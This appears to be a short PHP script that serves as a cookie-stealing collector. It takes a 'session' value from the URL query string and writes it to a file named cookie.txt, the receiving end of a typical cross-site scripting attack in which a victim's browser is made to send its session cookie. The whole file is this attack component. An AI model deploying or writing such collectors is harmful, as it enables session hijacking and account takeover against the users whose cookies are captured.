<?php
	
	$luutru_cookie = $_GET['session'];

	$file = fopen("cookie.txt","w+");

	fwrite($file, $luutru_cookie);

	fclose($file);
	
?>